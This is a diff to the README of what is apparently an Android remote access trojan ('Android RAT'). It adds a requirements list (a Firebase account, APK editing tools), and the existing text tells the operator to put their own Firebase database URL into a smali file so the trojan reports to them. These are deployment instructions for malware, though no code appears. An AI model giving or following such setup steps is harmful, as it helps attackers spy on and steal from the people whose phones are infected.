@@ -7,6 +7,10 @@ Apk error fix 🥰
 ### Video
 
 ---
+## Requirements
+ - Firebase Account
+ - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
+[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)
 
 ### Android RAT
  [*] Don't forget to add firebase url in ```smali_classes3/lizord/demon/MainActivity.smali``` search for ```databaseURL``` and change it to your database url
